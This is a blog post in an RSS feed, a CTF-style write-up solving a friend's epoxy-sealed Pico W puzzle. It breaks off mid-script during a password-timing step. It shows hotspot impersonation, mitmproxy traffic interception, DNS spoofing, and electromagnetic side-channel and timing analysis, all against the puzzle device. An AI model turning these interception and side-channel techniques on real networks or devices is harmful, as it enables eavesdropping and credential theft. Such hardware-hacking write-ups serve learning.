<?xml version="1.0" encoding="UTF-8"?>
<rss  xmlns:atom="http://www.w3.org/2005/Atom" 
      xmlns:media="http://search.yahoo.com/mrss/" 
      xmlns:content="http://purl.org/rss/1.0/modules/content/" 
      xmlns:dc="http://purl.org/dc/elements/1.1/" 
      version="2.0">
<channel>
<title>nilswiersma.github.io</title>
<link>https://nilswiersma.github.io/</link>
<atom:link href="https://nilswiersma.github.io/index.xml" rel="self" type="application/rss+xml"/>
<description></description>
<generator>quarto-1.4.544</generator>
<lastBuildDate>Fri, 12 Apr 2024 22:00:00 GMT</lastBuildDate>
<item>
  <title>Sergei’s Mystery Block</title>
  <link>https://nilswiersma.github.io/2024/sergei23/sergei23.html</link>
  <description><![CDATA[ 




<section id="intro" class="level1">
<h1>Intro</h1>
<p>My friend Sergei got creative and this mysterious block of transparent epoxy. What could be inside?</p>
<div id="fig-mystery-block" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-mystery-block-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/epoxy.jpg" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-mystery-block-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;1: Mystery block
</figcaption>
</figure>
</div>
<p>Inside we see a <a href="https://www.raspberrypi.com/documentation/microcontrollers/raspberry-pi-pico.html#raspberry-pi-pico-w-and-pico-wh">Pico W</a>, a thicc capacitor from VSYS to GND, a coil hovering over the RP2040 connecting a GPIO to GND, and some kind of glass tube connecting 3V3(OUT) to another GPIO. There are four legs that expose VSYS, GND, and two more GPIOs.</p>
<p>How can the Pico talk to us, and how can we talk back? Since it’s the W version, it can talk WiFi and Bluetooth; the two GPIOs can be used for something with two wires like UART or I2C; there is the built-in LED next to the micro USB port that might react to something; there’s the big coil that might be able to send or receive electromagnetic signals; and finally there is the glass tube that surely is used for something.</p>
</section>
<section id="sec-wired" class="level1">
<h1>Wired</h1>
<p>Let’s start with the two GPIOs. A good first guess is that these are used as TX and RX pins for a UART interface with a 115200 baudrate. To test this I hooked them up to an FTD1232 UART &lt;-&gt; USB adapter, and after swapping the RX and TX pins back and forth three times, the folling shows up in <code>picocom</code>:</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">*********************************************************************</span>
<span id="cb1-2">**************************The last CTF*******************************</span>
<span id="cb1-3">*********************************************************************</span>
<span id="cb1-4"></span>
<span id="cb1-5">Connecting online...</span>
<span id="cb1-6">Connecting online...</span>
<span id="cb1-7">Connecting online...</span>
<span id="cb1-8">Connecting online...</span>
<span id="cb1-9">Connecting online...</span>
<span id="cb1-10">Connecting online...</span>
<span id="cb1-11">Connecting online...</span>
<span id="cb1-12">Connecting online...</span>
<span id="cb1-13">Connecting online...</span>
<span id="cb1-14">Connecting online...</span>
<span id="cb1-15">I just want to be in the office... Try again!</span>
<span id="cb1-16">Connecting online...</span>
<span id="cb1-17">Connecting online...</span></code></pre></div>
<p>It keeps repeating that message forever. It seems to be looking for some kind of office network?</p>
</section>
<section id="sec-wireless" class="level1">
<h1>Wireless</h1>
<p>The message that shows up on the wired interface suggests it uses the Wifi module to talk to the internet. There’s a good chance it tries to talk to Riscure’s guest network. After some <a href="https://www.markloveless.net/blog/2020/7/7/my-mitmsniffing-station">fiddling</a> with network configuration on my laptop, the following sets up a wireless network with that SSID, and forwards the wired network so that it can go online, while also making it possible to transparantly monitor what is going on with <a href="">mitmproxy</a>:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Use nmcli to setup a hotspot</span></span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nmcli</span> dev wifi hotspot ifname wlp61s0 ssid <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Riscure Guests"</span> password <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"internet4you"</span></span>
<span id="cb2-3"></span>
<span id="cb2-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Configure internet and mitmproxy</span></span>
<span id="cb2-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sysctl</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> net.ipv4.ip_forward=1</span>
<span id="cb2-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sysctl</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> net.ipv6.conf.all.forwarding=1</span>
<span id="cb2-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sysctl</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> net.ipv4.conf.all.send_redirects=0</span>
<span id="cb2-8"></span>
<span id="cb2-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">iptables</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> nat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-A</span> PREROUTING <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> wlp61s0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> tcp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dport</span> 80 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-j</span> REDIRECT <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--to-port</span> 8080</span>
<span id="cb2-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">iptables</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> nat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-A</span> PREROUTING <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> wlp61s0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> tcp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dport</span> 443 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-j</span> REDIRECT <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--to-port</span> 8080</span>
<span id="cb2-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ip6tables</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> nat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-A</span> PREROUTING <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> wlp61s0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> tcp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dport</span> 80 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-j</span> REDIRECT <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--to-port</span> 8080</span>
<span id="cb2-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ip6tables</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> nat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-A</span> PREROUTING <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> wlp61s0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> tcp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dport</span> 443 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-j</span> REDIRECT <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--to-port</span> 8080</span>
<span id="cb2-13"></span>
<span id="cb2-14"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Start mitmproxy</span></span>
<span id="cb2-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mitmproxy</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--mode</span> transparent <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--showhost</span></span></code></pre></div>
<p>The Pico shows up in the hotspot’s network:</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">$ arp</span>
<span id="cb3-2">Address                  HWtype  HWaddress           Flags Mask            Iface</span>
<span id="cb3-3">10.42.0.42               ether   28:cd:c1:0a:e3:9f   C                     wlp61s0</span>
<span id="cb3-4">...</span></code></pre></div>
<p>And the following shows up on the UART output:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">...</span>
<span id="cb4-2">Connecting online...</span>
<span id="cb4-3">Connected</span>
<span id="cb4-4">Updating current time...</span>
<span id="cb4-5">Welcome! Curent time: 2023-10-30 19:57:39 . Have you thought how much time you wasted solving this?</span>
<span id="cb4-6">I chose a number.</span>
<span id="cb4-7">What number is it?</span>
<span id="cb4-8">&gt; �</span></code></pre></div>
<p>A single request goes to <a href="">http://just-the-time.appspot.com/</a>. To catch the response with mitmproxy, configure an intercept filter (<code>i</code>) to catch all responses (<code>~s</code>). When the response shows up in the flow, navigate to it, edit (<code>e</code>) the response_body (<code>b</code>), press <code>q</code> to go back and <code>a</code> to send it.</p>
<p>Knowing the URL it fetches from, we can also set up the local DNS service such that the <a href="appspot.com"></a> domain goes to <code>127.0.0.1</code> instead:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">$ cat /etc/hosts</span>
<span id="cb5-2">127.0.0.1       just-the-time.appspot.com</span></code></pre></div>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">$ cat /etc/NetworkManager/dnsmasq-shared.d/hosts.conf</span>
<span id="cb6-2">address=/.com/10.42.0.1</span></code></pre></div>
<p>Once set up, run <code>sudo systemctl reload NetworkManager.service</code> to reload the config.</p>
<p>Now we can host our own reply server and don’t have to man-in-the-middle it anymore. This can be done with a simple Python script:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb7-1"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> http.server</span>
<span id="cb7-2"></span>
<span id="cb7-3"><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">class</span> VerboseHTTPServer(http.server.HTTPServer):</span>
<span id="cb7-4">    <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">def</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">__init__</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>, server_address, RequestHandlerClass):</span>
<span id="cb7-5">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">super</span>().<span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">__init__</span>(server_address, RequestHandlerClass)</span>
<span id="cb7-6">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.RequestHandlerClass.server_version <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VerboseHTTP/1.0"</span></span>
<span id="cb7-7"></span>
<span id="cb7-8">    <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">def</span> get_request(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb7-9">        client, client_address <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">super</span>().get_request()</span>
<span id="cb7-10">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">f"Received request from </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span>client_address[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>]<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span>)</span>
<span id="cb7-11">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> client, client_address</span>
<span id="cb7-12"></span>
<span id="cb7-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">class</span> VerboseHandler(http.server.BaseHTTPRequestHandler):</span>
<span id="cb7-14">    <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">def</span> do_GET(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb7-15">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.send_response(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">200</span>)</span>
<span id="cb7-16">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.send_header(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Content-type'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'text/plain'</span>)</span>
<span id="cb7-17">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.end_headers()</span>
<span id="cb7-18">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.wfile.write(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'AAAAAAAAAAAAAAAAAAAAAAA'</span>)</span>
<span id="cb7-19"></span>
<span id="cb7-20"><span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">__name__</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'__main__'</span>:</span>
<span id="cb7-21">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">try</span>:</span>
<span id="cb7-22">        server <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> VerboseHTTPServer((<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'0.0.0.0'</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">80</span>), VerboseHandler)</span>
<span id="cb7-23">        server.serve_forever()</span>
<span id="cb7-24">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">except</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">KeyboardInterrupt</span>:</span>
<span id="cb7-25">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Server stopped.'</span>)</span></code></pre></div>
</section>
<section id="choosing-a-number" class="level1">
<h1>Choosing a number</h1>
<p>Back to the wired communication.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb8-1">What number is it?</span>
<span id="cb8-2">&gt; </span></code></pre></div>
<p>Inputting numbers gives a reply <code>Try again..</code>, inputting something non-numeric gives <code>NaN</code>. Prefixing a hexadecimal number with <code>0x</code> seems to make it accept it as a number as well, as there is no <code>NaN</code> reply. The same holds true for prefixing a binary number with <code>0b</code>.</p>
<p>For some reason there is a short pulse on the UART lines that gets intepreted as a <code>0xfe</code> byte, which is the non-printable � shown below. This byte did not seem to have any meaning. It does make it such as that the first input always results in the <code>NaN</code> response, as it cannot parse the input string containing this byte into a number.</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb9-1">What number is it?</span>
<span id="cb9-2">&gt; �1</span>
<span id="cb9-3"></span>
<span id="cb9-4">NaN</span>
<span id="cb9-5">I chose a number.</span>
<span id="cb9-6">What number is it?</span>
<span id="cb9-7">&gt; 1</span>
<span id="cb9-8">Try again..</span>
<span id="cb9-9">I chose a number.</span>
<span id="cb9-10">What number is it?</span>
<span id="cb9-11">&gt; </span>
<span id="cb9-12"></span>
<span id="cb9-13">NaN</span></code></pre></div>
<p>My first guess was that the value fetched from <a href="">just-the-time.appspot.com</a> is used as some kind of seed for the number to be input. Knowing Sergei, and the fact that <code>0x</code> and <code>0b</code> strings also get parsed into numbers, he probably used <a href="https://docs.micropython.org/en/latest/">MicroPython</a> to implement this. So I took a look at how random number generation is implemented there, and the <a href="https://docs.micropython.org/en/latest/library/random.html#other-functions">seed can be set</a>. Unfortunately, unlike normal Python’s <a href="https://docs.python.org/3/library/random.html#random.seed"><code>seed</code> function</a>, MicroPython’s seed function does not accept any arbitrary string, only a number. There is a sytem in MicroPython’s <a href="https://docs.micropython.org/en/latest/library/time.html#time.mktime"><code>time</code></a> implementation to go from a tuple of date information to a timestamp, so perhaps this is how the time string is converted into a number. I tried setting the string to <code>1970-01-01 00:00:00</code> to make this potential seed 0.</p>
<p>The next question is how this number might be generated. I could not find any hint or suggestion as to how, so I tried a few things on a second Pico running MicroPython as well. I tried generating values of various bit-length using <a href="https://docs.micropython.org/en/latest/library/random.html#random.getrandbits"><code>getrandbits</code></a>, and various ranges using <a href="https://docs.micropython.org/en/latest/library/random.html#random.randint"><code>randint</code></a>. None of this resulted in a number that gives a different reply.</p>
<p>Since the output very explicitly says <code>I chose a number</code>, maybe <code>random.choice</code> is used? Maybe by chosing a random value from the string returned by the GET request. I tried returning <code>AAAAAAA</code> as the date string, and providing <code>0x41</code> as number input. This, again, did not result in any different reply either.</p>
</section>
<section id="the-hovering-coil" class="level1">
<h1>The hovering coil</h1>
<p>Next I took a look at the coil suspiciously hanging over the RP2040. Perhaps it provides some <a href="https://en.wikipedia.org/wiki/Side-channel_attack">side-channel information</a> about what is going on?</p>
<p>At home I have a small Picoscope 2204A (10MS/s, 8kS memory). If there is some electromagnetic signal coming from the coil, it might be possible to pick it up by holding a short piece of turned wire over it, connected to one of the Picoscope probes. The result of this budget setup is shown in Figure&nbsp;2; the piece of blue wire is the improvised measurement coil.</p>
<div id="fig-coil-3" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-coil-3-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/coil-on-coil-3.jpg" class="img-fluid figure-img" style="width:80.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-coil-3-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;2: Budget EM measurement
</figcaption>
</figure>
</div>
<p>This very simple setup seems good enough to show that there is something going on between the messages <code>Try again...</code> and <code>I chose a number</code>, as shown in Figure&nbsp;3. This looks suspiciously like the <a href="https://en.wikipedia.org/wiki/Side-channel_attack#/media/File:Power_attack.png">classic RSA simple power analysis example</a>, where depending on whether a bit in the private key is 1 or 0, the operation of the algorithm that depends on the value of that bit leaks information through power consumption for a longer or shorted time, respectively.</p>
<div id="fig-coil-1" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-coil-1-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/coil-on-coil-1.png" class="img-fluid figure-img">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-coil-1-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;3: EM activity!
</figcaption>
</figure>
</div>
<p>So if the longer blocks in Figure&nbsp;3 mean a 1, and shorter blocks mean a 0, perhaps the number is <code>0b1101100111000100011010</code>, which is 3567898 in decimal.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb10-1">...</span>
<span id="cb10-2">&gt; 3567898</span>
<span id="cb10-3">Finally!</span>
<span id="cb10-4"></span>
<span id="cb10-5">You have guessed the number correctly!</span>
<span id="cb10-6">...</span></code></pre></div>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb11-1">...</span>
<span id="cb11-2">&gt; 0b0b1101100111000100011010</span>
<span id="cb11-3">Finally!</span>
<span id="cb11-4"></span>
<span id="cb11-5">You have guessed the number correctly!</span>
<span id="cb11-6">...</span></code></pre></div>
<p>Either way provides us with the <code>You have guessed the number correctly!</code> reply! Next, we are presented with the following password input question:</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb12-1">You have guessed the number correctly!</span>
<span id="cb12-2">Enter password to authenticate:</span>
<span id="cb12-3">&gt; </span></code></pre></div>
</section>
<section id="the-glass-tube" class="level1">
<h1>The glass tube</h1>
<p>So far we have not looked at the glass tube yet. It is connected between the Pico’s 3V3 output, and a GPIO, so it probably makes the GPIO read 1 or 0. Figure&nbsp;4 shows a closer up picture of the thing.</p>
<div id="fig-reed" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-reed-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/mystery-tube-0002.jpg" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-reed-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;4: Magnetic reed switch
</figcaption>
</figure>
</div>
<p>After some reverse image searching on Google, I found a forum post where they mentioned that this is called a <a href="https://en.wikipedia.org/wiki/Reed_switch">reed switch</a>. These are switches that get pulled together (or apart) when a magnetic field is nearby. Using my cheap microscope, you can see in Figure&nbsp;6 that indeed, when you hold a magnet nearby, the two plates come together.</p>
<div id="fig-reed2" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-reed2-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/mystery-tube.gif" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-reed2-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;5: Reed switch with magnet
</figcaption>
</figure>
</div>
<p>Powering the board while holding a magnet holding next to the switch adds some extra output! However, holding it there too long however triggers the second line as shown below, claiming a reboot.<sup>1</sup></p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb13-1">...</span>
<span id="cb13-2">***Hint***  Holdnig the magnet can give you hints sometimes ***Hint***</span>
<span id="cb13-3">Magnet sensor is triggered. Rebooting..</span></code></pre></div>
<p>There also is a hint for the number guessing, but at this point we already figured that one out. <!-- I learned later that the misspelling in "langer" is a hint that you could use a [langer probe](https://www.langer-emv.de/en/product/lf-passive-100-khz-up-to-50-mhz/36/lf1-set-near-field-probes-100-khz-up-to-50-mhz/267) to measure the EM signal. --></p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb14-1">***Hint***  Guess it! I cannot wait any langer  ***Hint***</span>
<span id="cb14-2">I chose a number.</span>
<span id="cb14-3">What number is it?</span>
<span id="cb14-4">&gt;</span></code></pre></div>
<p>Playing around with the magnet around the point where we are now, the password guessing, the following hint pops up:</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb15-1">***Hint***  Checking password in a blink of an eye  ***Hint***</span>
<span id="cb15-2">Enter password to authenticate:</span>
<span id="cb15-3">&gt; </span></code></pre></div>
<p>While messing with the magnet during this password check, sometimes a different message pops up. These all seem to be amazing magnet puns!</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb16-1">***Hint***  Did you hear about the magnetic sensor's party? It had a very </span>
<span id="cb16-2">attractive guest list!  ***Hint***</span>
<span id="cb16-3"></span>
<span id="cb16-4">***Hint***  What do you call a magnetic sensor with a great sense of </span>
<span id="cb16-5">humor? A real 'attract-ion'!    ***Hint***</span>
<span id="cb16-6"></span>
<span id="cb16-7">***Hint***  Why did the magnetic sensor apply for a job? Because it </span>
<span id="cb16-8">wanted to attract success!  ***Hint***</span>
<span id="cb16-9"></span>
<span id="cb16-10">***Hint***      What's a magnetic sensor's favorite kind of music? </span>
<span id="cb16-11">Heavy metal, of course!      ***Hint***</span></code></pre></div>
<p>But not useful to where we are now.</p>
<p>Maybe the “blink” refers to the LED?</p>
</section>
<section id="blinky-led" class="level1">
<h1>Blinky LED</h1>
<p>The onboard LED is on when the board is powered on. After typing some random inputs for the password, the LED seems to faintly, quickly, turn off and on.</p>
<div id="fig-reed2" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-reed2-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2024/sergei23/figs/LED.gif" class="img-fluid figure-img" style="width:75.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-reed2-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;6: Blinkyblink
</figcaption>
</figure>
</div>
<p>This happens as soon as you send exactly 21 characters. I made a script on a second Pico to see if there is any noticable difference in timing between sending the <code>\r</code> to send the input, and receiving the first byte from the reply. With this I started looking for other lengths that result in different lengths:</p>
<div id="lst-script" class="Python listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-script-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;1: Guess and measure
</figcaption>
<div aria-describedby="lst-script-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-script" style="background: #f1f3f5;"><pre class="sourceCode Python code-with-copy"><code class="sourceCode python"><span id="lst-script-1">u <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> UART(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>, baudrate<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">115200</span>, timeout<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2000</span>, rxbuf<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1024</span>)</span>
<span id="lst-script-2">timings <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> {}</span>
<span id="lst-script-3">rounds <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">200</span></span>
<span id="lst-script-4"><span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> x <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">range</span>(rounds):</span>
<span id="lst-script-5">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> i <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">range</span>(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">50</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>):</span>
<span id="lst-script-6">        u.write(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytearray</span>([<span class="bn" style="color: #AD0000;
background-color: null;
font-style: inherit;">0x20</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> (i <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">94</span>)] <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> i))</span>
<span id="lst-script-7">        ret <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b''</span></span>
<span id="lst-script-8">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Read back local echo</span></span>
<span id="lst-script-9">        ret <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+=</span> u.read(i)</span>
<span id="lst-script-10">        u.write(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\r</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>)</span>
<span id="lst-script-11">        t0 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> utime.ticks_cpu()</span>
<span id="lst-script-12">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># \r + first response char</span></span>
<span id="lst-script-13">        ret <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+=</span> u.read(<span class="dv" style="color: #AD0000;
background-color: null;
